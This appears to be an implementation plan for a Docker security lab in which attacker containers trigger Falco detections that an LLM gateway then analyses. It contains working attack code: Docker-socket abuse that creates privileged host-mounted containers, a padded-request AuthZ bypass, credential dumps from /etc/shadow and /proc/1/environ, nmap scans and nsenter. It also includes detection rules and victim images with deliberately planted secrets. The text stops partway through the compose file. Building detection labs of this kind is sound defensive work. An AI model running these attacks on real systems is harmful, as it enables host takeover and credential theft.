# Multi-Attacker Docker Security Simulation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Docker Compose environment with 5 specialized attacker containers, each isolated per network, targeting misconfigured victim containers — detected by Falco and analyzed in real-time by a dual-LLM AI gateway (GPT-5.4-nano for triage, GPT-5.5 for deep analysis) via LiteLLM.

**Architecture:** 5 isolated Docker bridge networks (one per scenario), each containing one attacker + one/two victim(s). Falco joins all networks as a privileged observer and POSTs alerts via webhook to a FastAPI AI gateway. Each attacker sleeps idle until triggered by `trigger.py --attack <name>` via HTTP POST /trigger.

**Tech Stack:** Docker Compose, Python 3.12, Flask (attacker trigger servers), FastAPI + uvicorn (AI gateway), LiteLLM 1.83.3, OpenAI GPT-5.4-nano + GPT-5.5, Falco falcosecurity/falco-no-driver:latest, requests-unixsocket

---

## Parallel Task Groups

Tasks 2–6 are **fully independent** and can be implemented simultaneously by parallel agents.
Tasks 7–8 depend on all prior tasks.

```
Task 1 (scaffold)
  └─▶ Task 2 (AI gateway)   ─┐
      Task 3 (Falco config)  ─┤
      Task 4 (escape pair)   ─┼──▶ Task 7 (docker-compose.yml)
      Task 5 (sock pair)     ─┤         └──▶ Task 8 (trigger.py + smoke test)
      Task 6a (lateral pair) ─┤
      Task 6b (secrets pair) ─┤
      Task 6c (authz pair)   ─┘
```

---

## Task 1: Project Scaffold

**Files:**
- Create: `.env.example`
- Create: `attackers/escape/`, `attackers/sock/`, `attackers/lateral/`, `attackers/secrets/`, `attackers/authz/` (empty dirs)
- Create: `victims/escape/`, `victims/sock/`, `victims/lateral-a/`, `victims/lateral-b/`, `victims/secrets/`, `victims/authz/` (empty dirs)
- Create: `falco/rules/` (empty dir)
- Create: `ai-gateway/` (empty dir)

- [ ] **Step 1: Create directory tree**

```bash
cd /home/shreyas/Desktop/docker_simulation
mkdir -p attackers/{escape,sock,lateral,secrets,authz}
mkdir -p victims/{escape,sock,lateral-a,lateral-b,secrets,authz}
mkdir -p falco/rules
mkdir -p ai-gateway
```

- [ ] **Step 2: Create `.env.example`**

Create file `/home/shreyas/Desktop/docker_simulation/.env.example`:
```env
OPENAI_API_KEY=sk-your-openai-api-key-here
AI_GATEWAY_PORT=8000
LITELLM_LOG=INFO
```

- [ ] **Step 3: Verify structure**

```bash
find /home/shreyas/Desktop/docker_simulation -type d | sort
```

Expected output includes: `attackers/escape`, `attackers/authz`, `victims/lateral-a`, `falco/rules`, `ai-gateway`

- [ ] **Step 4: Commit**

```bash
cd /home/shreyas/Desktop/docker_simulation
git init
git add .env.example
git commit -m "chore: scaffold project directory structure"
```

---

## Task 2: AI Gateway Service

**Files:**
- Create: `ai-gateway/main.py`
- Create: `ai-gateway/analyzer.py`
- Create: `ai-gateway/prompts.py`
- Create: `ai-gateway/requirements.txt`
- Create: `ai-gateway/Dockerfile`

- [ ] **Step 1: Create `ai-gateway/requirements.txt`**

```
fastapi==0.115.0
uvicorn[standard]==0.30.6
litellm==1.83.3
httpx==0.27.2
```

- [ ] **Step 2: Create `ai-gateway/prompts.py`**

```python
def triage_prompt(alert: dict) -> list[dict]:
    return [
        {
            "role": "system",
            "content": (
                "You are a container security triage analyst. "
                "Respond with exactly ONE sentence in this format: "
                "[SEVERITY: LOW|MEDIUM|HIGH|CRITICAL] <what happened in plain English>."
            ),
        },
        {"role": "user", "content": f"Falco alert JSON: {alert}"},
    ]


def deep_prompt(alert: dict) -> list[dict]:
    return [
        {
            "role": "system",
            "content": (
                "You are a senior container security expert. "
                "Given a Falco alert, respond with a JSON object containing exactly these keys:\n"
                "- mitre_technique: MITRE ATT&CK technique ID and name (e.g. T1611 - Escape to Host)\n"
                "- what_happened: 2-3 sentence plain-English explanation\n"
                "- misconfiguration: the exact Docker/container config that enabled this attack\n"
                "- predicted_next_move: what the attacker will likely do next (1 sentence)\n"
                "- risk_score: integer 0-10\n"
                "- hardened_config: the corrected Docker Compose snippet that prevents this attack\n"
                "Respond with ONLY the JSON object, no markdown fences."
            ),
        },
        {"role": "user", "content": f"Falco alert JSON: {alert}"},
    ]
```

- [ ] **Step 3: Create `ai-gateway/analyzer.py`**

```python
import asyncio
import json
import litellm
from prompts import triage_prompt, deep_prompt

TRIAGE_MODEL = "openai/gpt-5.4-nano"
ANALYSIS_MODEL = "openai/gpt-5.5"


async def analyze_alert(alert: dict) -> None:
    scenario = (
        alert.get("output_fields", {}).get("container.label.scenario")
        or alert.get("hostname", "unknown")
    )
    rule = alert.get("rule", "unknown-rule")

    triage_resp, deep_resp = await asyncio.gather(
        litellm.acompletion(
            model=TRIAGE_MODEL,
            messages=triage_prompt(alert),
            max_tokens=80,
        ),
        litellm.acompletion(
            model=ANALYSIS_MODEL,
            messages=deep_prompt(alert),
            max_tokens=600,
            response_format={"type": "json_object"},
        ),
    )

    triage_text = triage_resp.choices[0].message.content.strip()
    deep_text = deep_resp.choices[0].message.content.strip()

    try:
        deep_json = json.loads(deep_text)
    except json.JSONDecodeError:
        deep_json = {"raw": deep_text}

    result = {
        "scenario": scenario,
        "rule": rule,
        "triage": triage_text,
        "analysis": deep_json,
    }

    severity = "CRITICAL" if "CRITICAL" in triage_text else (
        "HIGH" if "HIGH" in triage_text else "MEDIUM"
    )
    color = "\033[91m" if severity == "CRITICAL" else (
        "\033[93m" if severity == "HIGH" else "\033[94m"
    )
    reset = "\033[0m"

    print(f"\n{color}{'='*60}{reset}")
    print(f"{color}[{severity}] {scenario} — {rule}{reset}")
    print(f"TRIAGE:   {triage_text}")
    print(f"ANALYSIS: {json.dumps(deep_json, indent=2)}")
    print(f"{color}{'='*60}{reset}\n", flush=True)
```

- [ ] **Step 4: Create `ai-gateway/main.py`**

```python
import asyncio
from fastapi import FastAPI, Request, BackgroundTasks
from analyzer import analyze_alert

app = FastAPI(title="Falco AI Gateway")


@app.get("/health")
async def health():
    return {"status": "ok"}


@app.post("/falco-alert")
async def falco_alert(request: Request, background_tasks: BackgroundTasks):
    alert = await request.json()
    background_tasks.add_task(analyze_alert, alert)
    return {"status": "received", "rule": alert.get("rule")}
```

- [ ] **Step 5: Create `ai-gateway/Dockerfile`**

```dockerfile
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000", "--log-level", "info"]
```

- [ ] **Step 6: Verify build locally**

```bash
cd /home/shreyas/Desktop/docker_simulation/ai-gateway
docker build -t ai-gateway-test .
```

Expected: `Successfully built` with no errors.

- [ ] **Step 7: Commit**

```bash
cd /home/shreyas/Desktop/docker_simulation
git add ai-gateway/
git commit -m "feat: add AI gateway with LiteLLM dual-model analysis (GPT-5.4-nano + GPT-5.5)"
```

---

## Task 3: Falco Configuration

**Files:**
- Create: `falco/falco.yaml`
- Create: `falco/rules/escape_rules.yaml`
- Create: `falco/rules/sock_rules.yaml`
- Create: `falco/rules/lateral_rules.yaml`
- Create: `falco/rules/secrets_rules.yaml`
- Create: `falco/rules/authz_rules.yaml`

- [ ] **Step 1: Create `falco/falco.yaml`**

```yaml
rules_file:
  - /etc/falco/falco_rules.yaml
  - /etc/falco/rules.d/

json_output: true
json_include_output_property: true
json_include_tags_property: true

log_stderr: true
log_syslog: false
log_level: info

http_output:
  enabled: true
  url: "http://ai-gateway:8000/falco-alert"
  user_agent: "falcosecurity/falco"
  insecure: false
  ca_cert: ""
  ca_bundle: ""
  ca_path: "/etc/ssl/certs"
  mtls: false
  client_cert: ""
  client_key: ""

stdout_output:
  enabled: true
```

- [ ] **Step 2: Create `falco/rules/escape_rules.yaml`**

```yaml
- rule: Container Escape via runc fd Leak (CVE-2024-21626)
  desc: Detects container escape attempt — process cwd traverses into /proc/self/fd host path
  condition: >
    spawned_process and container and
    (proc.cwd startswith "/proc/self/fd" or
     proc.cwd startswith "/proc/1/fd")
  output: >
    CVE-2024-21626 escape attempt: process cwd points to host fd path
    (user=%user.name container=%container.name image=%container.image.repository
     command=%proc.cmdline cwd=%proc.cwd scenario=container-escape)
  priority: CRITICAL
  tags: [container, escape, mitre_t1611, CVE-2024-21626]
```

- [ ] **Step 3: Create `falco/rules/sock_rules.yaml`**

```yaml
- rule: Docker Socket Write from Container
  desc: A container is writing to /var/run/docker.sock — full Docker Engine API access
  condition: >
    (open_write or open_read) and container and
    fd.name = "/var/run/docker.sock"
  output: >
    Docker socket access from container — possible host takeover
    (user=%user.name container=%container.name image=%container.image.repository
     proc=%proc.cmdline scenario=docker-socket-abuse)
  priority: CRITICAL
  tags: [container, docker_sock, mitre_t1610]

- rule: New Privileged Container Created via Socket
  desc: Docker API used from inside container to spawn another privileged container
  condition: >
    spawned_process and container and
    proc.name in (docker, dockerd) and
    proc.cmdline contains "--privileged"
  output: >
    Privileged sibling container spawned via Docker API
    (user=%user.name container=%container.name cmd=%proc.cmdline scenario=docker-socket-abuse)
  priority: CRITICAL
  tags: [container, docker_sock, mitre_t1610]
```

- [ ] **Step 4: Create `falco/rules/lateral_rules.yaml`**

```yaml
- rule: Lateral Movement via nsenter
  desc: nsenter used inside a container to enter another process namespace
  condition: >
    spawned_process and container and
    proc.name = "nsenter"
  output: >
    nsenter lateral movement attempt detected
    (user=%user.name container=%container.name cmdline=%proc.cmdline scenario=lateral-movement)
  priority: HIGH
  tags: [container, lateral_movement, mitre_t1609]

- rule: Unexpected Internal Network Scan
  desc: Container performing a subnet scan — indicative of reconnaissance for lateral movement
  condition: >
    spawned_process and container and
    proc.name in (nmap, masscan, zmap)
  output: >
    Network scan from container (lateral movement recon)
    (user=%user.name container=%container.name proc=%proc.name args=%proc.args scenario=lateral-movement)
  priority: HIGH
  tags: [container, lateral_movement, mitre_t1046]
```

- [ ] **Step 5: Create `falco/rules/secrets_rules.yaml`**

```yaml
- rule: Sensitive File Read in Container
  desc: Container reading /etc/shadow or mounted Kubernetes secrets
  condition: >
    open_read and container and
    (fd.name = "/etc/shadow" or
     fd.name = "/etc/gshadow" or
     fd.name startswith "/var/run/secrets" or
     fd.name startswith "/run/secrets" or
     fd.name startswith "/mnt/secrets")
  output: >
    Sensitive credential file accessed
    (user=%user.name container=%container.name file=%fd.name proc=%proc.cmdline scenario=sensitive-file-access)
  priority: HIGH
  tags: [container, credential_access, mitre_t1552]

- rule: Process Environment Dump
  desc: Container reading /proc/*/environ — may expose API keys and passwords in env vars
  condition: >
    open_read and container and
    fd.name glob "/proc/*/environ"
  output: >
    Process environment dump (possible API key/secret extraction)
    (user=%user.name container=%container.name proc=%proc.cmdline file=%fd.name scenario=sensitive-file-access)
  priority: MEDIUM
  tags: [container, credential_access, mitre_t1552_001]
```

- [ ] **Step 6: Create `falco/rules/authz_rules.yaml`**

```yaml
- rule: Docker AuthZ Bypass via Oversized Request (CVE-2026-34040)
  desc: >
    Detects a write to Docker socket with an unusually large payload,
    indicating a CVE-2026-34040 AuthZ plugin bypass attempt
  condition: >
    open_write and container and
    fd.name = "/var/run/docker.sock"
  output: >
    CVE-2026-34040 AuthZ bypass attempt — oversized Docker API request
    (container=%container.name user=%user.name proc=%proc.cmdline scenario=authz-bypass)
  priority: CRITICAL
  tags: [container, authz_bypass, mitre_t1610, CVE-2026-34040]
```

- [ ] **Step 7: Commit**

```bash
cd /home/shreyas/Desktop/docker_simulation
git add falco/
git commit -m "feat: add Falco config with 5 custom rule sets (escape, sock, lateral, secrets, authz)"
```

---

## Task 4: Attacker-Escape + Victim-Escape

**Files:**
- Create: `attackers/escape/server.py`
- Create: `attackers/escape/attack.sh`
- Create: `attackers/escape/requirements.txt`
- Create: `attackers/escape/Dockerfile`
- Create: `victims/escape/Dockerfile`

- [ ] **Step 1: Create `attackers/escape/requirements.txt`**

```
flask==3.0.3
```

- [ ] **Step 2: Create `attackers/escape/server.py`**

```python
import subprocess
import threading
from flask import Flask, jsonify

app = Flask(__name__)
_attacking = False


@app.get("/health")
def health():
    return jsonify({"status": "ready", "scenario": "container-escape-CVE-2024-21626"})


@app.post("/trigger")
def trigger():
    global _attacking
    if _attacking:
        return jsonify({"status": "already_attacking"})
    _attacking = True
    t = threading.Thread(target=_run_attack, daemon=True)
    t.start()
    return jsonify({"status": "attacking", "scenario": "container-escape-CVE-2024-21626"})


def _run_attack():
    subprocess.run(["/bin/bash", "/attack.sh"], check=False)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
```

- [ ] **Step 3: Create `attackers/escape/attack.sh`**

```bash
#!/bin/bash
set -euo pipefail

echo "[ESCAPE] CVE-2024-21626 Simulation — runc /proc/self/fd WORKDIR escape"
echo "[ESCAPE] Listing /proc/self/fd to trigger syscall detection..."
ls -la /proc/self/fd/

echo "[ESCAPE] Traversing into /proc/self/fd (Falco: proc.cwd startswith /proc/self/fd)..."
cd /proc/self/fd/ && pwd

echo "[ESCAPE] Enumerating fd symlinks for host filesystem references..."
for fd in /proc/self/fd/*; do
    target=$(readlink "$fd" 2>/dev/null || true)
    if [[ "$target" == "/"* ]] && [[ "$target" != "/proc"* ]] && [[ "$target" != "/dev"* ]]; then
        echo "[ESCAPE][!] Host fd symlink: $fd -> $target"
    fi
done

echo "[ESCAPE] Attack simulation complete — check Falco + AI gateway output"
```

- [ ] **Step 4: Create `attackers/escape/Dockerfile`**

```dockerfile
FROM python:3.12-slim
RUN pip install --no-cache-dir flask==3.0.3
WORKDIR /
COPY server.py /server.py
COPY attack.sh /attack.sh
RUN chmod +x /attack.sh
HEALTHCHECK --interval=5s --timeout=3s --retries=3 \
    CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:5000/health')"
CMD ["python", "/server.py"]
```

- [ ] **Step 5: Create `victims/escape/Dockerfile`**

```dockerfile
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq procps && rm -rf /var/lib/apt/lists/*
# Intentional misconfiguration: WORKDIR points into /proc/self/fd
# In a vulnerable runc this becomes the host cwd; simulated here for Falco detection
WORKDIR /proc/self/fd
LABEL scenario="container-escape" misconfiguration="workdir-proc-fd"
CMD ["sleep", "infinity"]
```

- [ ] **Step 6: Verify builds**

```bash
cd /home/shreyas/Desktop/docker_simulation
docker build -t attacker-escape-test attackers/escape/
docker build -t victim-escape-test victims/escape/
```

Expected: both images build successfully.

- [ ] **Step 7: Commit**

```bash
git add attackers/escape/ victims/escape/
git commit -m "feat: add container-escape attacker (CVE-2024-21626) and victim pair"
```

---

## Task 5: Attacker-Sock + Victim-Sock

**Files:**
- Create: `attackers/sock/server.py`
- Create: `attackers/sock/attack.py`
- Create: `attackers/sock/requirements.txt`
- Create: `attackers/sock/Dockerfile`
- Create: `victims/sock/Dockerfile`

- [ ] **Step 1: Create `attackers/sock/requirements.txt`**

```
flask==3.0.3
requests-unixsocket2==0.4.0
requests==2.32.3
```

- [ ] **Step 2: Create `attackers/sock/attack.py`**

```python
import json
import requests_unixsocket


SOCK_BASE = "http+unix://%2Fvar%2Frun%2Fdocker.sock"


def run_attack() -> None:
    session = requests_unixsocket.Session()

    print("[SOCK] Docker Socket Abuse Simulation")
    print("[SOCK] Enumerating containers via Docker API...")

    resp = session.get(f"{SOCK_BASE}/containers/json?all=true", timeout=5)
    containers = resp.json()
    for c in containers:
        print(f"[SOCK][!] Container: {c.get('Names')} | Image: {c.get('Image')} | State: {c.get('State')}")

    print("[SOCK] Attempting to create privileged sibling container with host mount...")
    payload = {
        "Image": "alpine",
        "Cmd": ["sh", "-c", "hostname && cat /host/etc/hostname 2>/dev/null || echo 'host mount ok'"],
        "HostConfig": {
            "Binds": ["/:/host:ro"],
            "Privileged": True,
        },
        "Labels": {"spawned_by": "attacker-sock", "scenario": "docker-socket-abuse"},
    }

    resp = session.post(
        f"{SOCK_BASE}/containers/create?name=attacker-spawned",
        data=json.dumps(payload),
        headers={"Content-Type": "application/json"},
        timeout=5,
    )

    if resp.status_code in (201, 409):
        print(f"[SOCK][!] SUCCESS: Privileged container created via docker.sock (status {resp.status_code})")
    else:
        print(f"[SOCK][-] Response {resp.status_code}: {resp.text[:200]}")

    print("[SOCK] Attack simulation complete — Falco should have fired on docker socket write")
```

- [ ] **Step 3: Create `attackers/sock/server.py`**

```python
import threading
from flask import Flask, jsonify
from attack import run_attack

app = Flask(__name__)
_attacking = False


@app.get("/health")
def health():
    return jsonify({"status": "ready", "scenario": "docker-socket-abuse"})


@app.post("/trigger")
def trigger():
    global _attacking
    if _attacking:
        return jsonify({"status": "already_attacking"})
    _attacking = True
    t = threading.Thread(target=run_attack, daemon=True)
    t.start()
    return jsonify({"status": "attacking", "scenario": "docker-socket-abuse"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
```

- [ ] **Step 4: Create `attackers/sock/Dockerfile`**

```dockerfile
FROM python:3.12-slim
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
WORKDIR /app
COPY server.py attack.py ./
HEALTHCHECK --interval=5s --timeout=3s --retries=3 \
    CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:5000/health')"
CMD ["python", "server.py"]
```

- [ ] **Step 5: Create `victims/sock/Dockerfile`**

```dockerfile
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq curl && rm -rf /var/lib/apt/lists/*
# Intentional misconfiguration: /var/run/docker.sock mounted in docker-compose.yml
LABEL scenario="docker-socket-abuse" misconfiguration="docker-sock-mount"
CMD ["sleep", "infinity"]
```

- [ ] **Step 6: Verify builds**

```bash
cd /home/shreyas/Desktop/docker_simulation
docker build -t attacker-sock-test attackers/sock/
docker build -t victim-sock-test victims/sock/
```

- [ ] **Step 7: Commit**

```bash
git add attackers/sock/ victims/sock/
git commit -m "feat: add docker-socket-abuse attacker and victim pair"
```

---

## Task 6a: Attacker-Lateral + Victims-Lateral

**Files:**
- Create: `attackers/lateral/server.py`
- Create: `attackers/lateral/attack.sh`
- Create: `attackers/lateral/requirements.txt`
- Create: `attackers/lateral/Dockerfile`
- Create: `victims/lateral-a/Dockerfile`
- Create: `victims/lateral-b/Dockerfile`

- [ ] **Step 1: Create `attackers/lateral/requirements.txt`**

```
flask==3.0.3
```

- [ ] **Step 2: Create `attackers/lateral/attack.sh`**

```bash
#!/bin/bash

echo "[LATERAL] Lateral Movement Simulation"

echo "[LATERAL] Installing nmap for network reconnaissance..."
apt-get install -y nmap -qq 2>/dev/null || true

echo "[LATERAL] Scanning lateral-net subnet (172.20.3.0/24)..."
nmap -sn 172.20.3.0/24 2>/dev/null | grep "Nmap scan report" | while read -r line; do
    echo "[LATERAL][!] Host found: $line"
done

echo "[LATERAL] Probing victim-lat-a HTTP service..."
curl -s --max-time 3 http://victim-lat-a/ 2>/dev/null \
    && echo "[LATERAL][!] Connected to victim-lat-a HTTP" \
    || echo "[LATERAL][-] victim-lat-a unreachable"

echo "[LATERAL] Probing victim-lat-b HTTP service..."
curl -s --max-time 3 http://victim-lat-b/ 2>/dev/null \
    && echo "[LATERAL][!] Connected to victim-lat-b HTTP" \
    || echo "[LATERAL][-] victim-lat-b unreachable"

echo "[LATERAL] Attempting nsenter into PID 1 namespace (triggers Falco rule)..."
nsenter --target 1 --mount --uts --ipc --net -- hostname 2>/dev/null \
    && echo "[LATERAL][!] nsenter SUCCESS — in host namespace" \
    || echo "[LATERAL][-] nsenter blocked (seccomp/cap restriction)"

echo "[LATERAL] Attack simulation complete"
```

- [ ] **Step 3: Create `attackers/lateral/server.py`**

```python
import subprocess
import threading
from flask import Flask, jsonify

app = Flask(__name__)
_attacking = False


@app.get("/health")
def health():
    return jsonify({"status": "ready", "scenario": "lateral-movement"})


@app.post("/trigger")
def trigger():
    global _attacking
    if _attacking:
        return jsonify({"status": "already_attacking"})
    _attacking = True
    t = threading.Thread(target=lambda: subprocess.run(["/bin/bash", "/attack.sh"], check=False), daemon=True)
    t.start()
    return jsonify({"status": "attacking", "scenario": "lateral-movement"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
```

- [ ] **Step 4: Create `attackers/lateral/Dockerfile`**

```dockerfile
FROM python:3.12-slim
RUN apt-get update -qq && apt-get install -y -qq curl nmap util-linux && rm -rf /var/lib/apt/lists/*
RUN pip install --no-cache-dir flask==3.0.3
WORKDIR /
COPY server.py /server.py
COPY attack.sh /attack.sh
RUN chmod +x /attack.sh
HEALTHCHECK --interval=5s --timeout=3s --retries=3 \
    CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:5000/health')"
CMD ["python", "/server.py"]
```

- [ ] **Step 5: Create `victims/lateral-a/Dockerfile`**

```dockerfile
FROM nginx:alpine
# Intentional misconfiguration: no network policy — open east-west
LABEL scenario="lateral-movement" misconfiguration="no-network-policy" role="victim-a"
```

- [ ] **Step 6: Create `victims/lateral-b/Dockerfile`**

```dockerfile
FROM nginx:alpine
# Intentional misconfiguration: no network policy — open east-west
LABEL scenario="lateral-movement" misconfiguration="no-network-policy" role="victim-b"
```

- [ ] **Step 7: Commit**

```bash
cd /home/shreyas/Desktop/docker_simulation
git add attackers/lateral/ victims/lateral-a/ victims/lateral-b/
git commit -m "feat: add lateral-movement attacker and two victim containers"
```

---

## Task 6b: Attacker-Secrets + Victim-Secrets

**Files:**
- Create: `attackers/secrets/server.py`
- Create: `attackers/secrets/attack.sh`
- Create: `attackers/secrets/requirements.txt`
- Create: `attackers/secrets/Dockerfile`
- Create: `victims/secrets/Dockerfile`

- [ ] **Step 1: Create `attackers/secrets/requirements.txt`**

```
flask==3.0.3
```

- [ ] **Step 2: Create `attackers/secrets/attack.sh`**

```bash
#!/bin/bash

echo "[SECRETS] Sensitive File Access Simulation"

echo "[SECRETS] Attempting to read /etc/shadow..."
if cat /etc/shadow 2>/dev/null; then
    echo "[SECRETS][!] /etc/shadow read successful — password hashes exposed"
else
    echo "[SECRETS][-] /etc/shadow not readable directly"
fi

echo "[SECRETS] Scanning for mounted Kubernetes secrets..."
for dir in /var/run/secrets /run/secrets /mnt/secrets /secrets; do
    if [ -d "$dir" ]; then
        echo "[SECRETS][!] Secret directory found: $dir"
        find "$dir" -type f 2>/dev/null | while read -r f; do
            echo "[SECRETS][!] Secret file: $f"
            head -c 100 "$f" 2>/dev/null
            echo ""
        done
    fi
done

echo "[SECRETS] Dumping environment variables for credential patterns..."
# Reading /proc/1/environ triggers Falco rule
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' \
    | grep -iE "(key|secret|password|token|api|jwt|db_|database)" \
    | head -20 \
    | while read -r line; do
        echo "[SECRETS][!] Credential env var: $line"
    done

# Also dump own env (less noisy but still valuable)
env | grep -iE "(key|secret|password|token|api|jwt|db_|database)" | head -10 \
    | while read -r line; do
        echo "[SECRETS][!] Own env credential: $line"
    done

echo "[SECRETS] Attack simulation complete"
```

- [ ] **Step 3: Create `attackers/secrets/server.py`**

```python
import subprocess
import threading
from flask import Flask, jsonify

app = Flask(__name__)
_attacking = False


@app.get("/health")
def health():
    return jsonify({"status": "ready", "scenario": "sensitive-file-access"})


@app.post("/trigger")
def trigger():
    global _attacking
    if _attacking:
        return jsonify({"status": "already_attacking"})
    _attacking = True
    t = threading.Thread(target=lambda: subprocess.run(["/bin/bash", "/attack.sh"], check=False), daemon=True)
    t.start()
    return jsonify({"status": "attacking", "scenario": "sensitive-file-access"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
```

- [ ] **Step 4: Create `attackers/secrets/Dockerfile`**

```dockerfile
FROM python:3.12-slim
RUN pip install --no-cache-dir flask==3.0.3
WORKDIR /
COPY server.py /server.py
COPY attack.sh /attack.sh
RUN chmod +x /attack.sh
HEALTHCHECK --interval=5s --timeout=3s --retries=3 \
    CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:5000/health')"
CMD ["python", "/server.py"]
```

- [ ] **Step 5: Create `victims/secrets/Dockerfile`**

```dockerfile
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq procps && rm -rf /var/lib/apt/lists/*
# Intentional misconfigurations:
#   1. Secrets baked into environment variables
#   2. Weak /etc/shadow (no shadow-utils hardening)
ENV DATABASE_PASSWORD=super_secret_db_pass_2024
ENV API_KEY=sk-prod-very-secret-key-do-not-share
ENV JWT_SECRET=jwt_signing_secret_weak
RUN echo "root:weakpassword" | chpasswd 2>/dev/null || true
LABEL scenario="sensitive-file-access" misconfiguration="secrets-in-env,weak-shadow"
CMD ["sleep", "infinity"]
```

- [ ] **Step 6: Commit**

```bash
cd /home/shreyas/Desktop/docker_simulation
git add attackers/secrets/ victims/secrets/
git commit -m "feat: add sensitive-file-access attacker and victim pair"
```

---

## Task 6c: Attacker-AuthZ + Victim-AuthZ (CVE-2026-34040)

**Files:**
- Create: `attackers/authz/server.py`
- Create: `attackers/authz/attack.py`
- Create: `attackers/authz/requirements.txt`
- Create: `attackers/authz/Dockerfile`
- Create: `victims/authz/Dockerfile`

- [ ] **Step 1: Create `attackers/authz/requirements.txt`**

```
flask==3.0.3
```

- [ ] **Step 2: Create `attackers/authz/attack.py`**

```python
import json
import socket

DOCKER_SOCK = "/var/run/docker.sock"
# CVE-2026-34040: body > 1MB causes Docker middleware to drop it before AuthZ plugin sees it
PADDING_SIZE = 1_100_000


def _send_raw(payload: bytes) -> str:
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        sock.connect(DOCKER_SOCK)
        sock.sendall(payload)
        chunks = []
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks).decode(errors="replace")
    finally:
        sock.close()


def run_attack() -> None:
    print("[AUTHZ] CVE-2026-34040 AuthZ Bypass Simulation")
    print(f"[AUTHZ] Crafting {PADDING_SIZE:,}-byte POST body (exceeds 1MB AuthZ inspection threshold)...")

    container_config = {
        "Image": "alpine",
        "Cmd": ["sh", "-c", "echo 'CVE-2026-34040: AuthZ bypassed' && hostname"],
        "HostConfig": {
            "Binds": ["/:/host:ro"],
            "Privileged": True,
        },
        "Labels": {"spawned_by": "attacker-authz", "scenario": "authz-bypass"},
        # This padding pushes the body past 1MB — AuthZ plugin sees an empty body and allows it
        "_cve_padding": "A" * PADDING_SIZE,
    }

    body = json.dumps(container_config).encode()
    print(f"[AUTHZ] Total request body size: {len(body):,} bytes")

    http_request = (
        f"POST /containers/create?name=authz-bypass-container HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body

    print("[AUTHZ] Sending oversized request to Docker socket (AuthZ plugin will see empty body)...")
    response = _send_raw(http_request)
    first_line = response.split("\r\n")[0] if "\r\n" in response else response[:80]
    print(f"[AUTHZ] Docker response: {first_line}")

    if "201" in first_line or "409" in first_line:
        print("[AUTHZ][!] CRITICAL: Container created despite AuthZ plugin — CVE-2026-34040 exploited!")
    elif "413" in first_line:
        print("[AUTHZ][-] Request rejected (413 Too Large) — Docker is patched or proxy is filtering")
    else:
        print(f"[AUTHZ] Full response snippet: {response[:300]}")

    print("[AUTHZ] Attack simulation complete — Falco should have fired on oversized socket write")


if __name__ == "__main__":
    run_attack()
```

- [ ] **Step 3: Create `attackers/authz/server.py`**

```python
import threading
from flask import Flask, jsonify
from attack import run_attack

app = Flask(__name__)
_attacking = False


@app.get("/health")
def health():
    return jsonify({"status": "ready", "scenario": "authz-bypass-CVE-2026-34040"})


@app.post("/trigger")
def trigger():
    global _attacking
    if _attacking:
        return jsonify({"status": "already_attacking"})
    _attacking = True
    t = threading.Thread(target=run_attack, daemon=True)
    t.start()
    return jsonify({"status": "attacking", "scenario": "authz-bypass-CVE-2026-34040"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
```

- [ ] **Step 4: Create `attackers/authz/Dockerfile`**

```dockerfile
FROM python:3.12-slim
RUN pip install --no-cache-dir flask==3.0.3
WORKDIR /app
COPY server.py attack.py ./
HEALTHCHECK --interval=5s --timeout=3s --retries=3 \
    CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:5000/health')"
CMD ["python", "server.py"]
```

- [ ] **Step 5: Create `victims/authz/Dockerfile`**

```dockerfile
FROM ubuntu:22.04
# Intentional misconfiguration: relies on AuthZ plugin for access control,
# no request-body-size limits configured on Docker daemon
LABEL scenario="authz-bypass" misconfiguration="no-request-size-limit,authz-plugin-only" cve="CVE-2026-34040"
CMD ["sleep", "infinity"]
```

- [ ] **Step 6: Commit**

```bash
cd /home/shreyas/Desktop/docker_simulation
git add attackers/authz/ victims/authz/
git commit -m "feat: add CVE-2026-34040 authz-bypass attacker and victim pair"
```

---

## Task 7: docker-compose.yml

**Files:**
- Create: `docker-compose.yml`

- [ ] **Step 1: Create `docker-compose.yml`**

```yaml
version: "3.9"

# ── Networks ─────────────────────────────────────────────────────────
networks:
  escape-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.1.0/24
  sock-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.2.0/24
  lateral-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.3.0/24
  secrets-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.4.0/24
  authz-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.5.0/24
  monitoring:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.6.0/24

services:

  # ── AI Gateway ───────────────────────────────────────────────────────
  ai-gateway:
    build: ./ai-gateway
    container_name: ai-gateway
    environment:
      - OPENAI_API_KEY=${OPENAI_API_KEY}
    ports:
      - "8000:8000"
    networks:
      - monitoring
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8000/health')"]
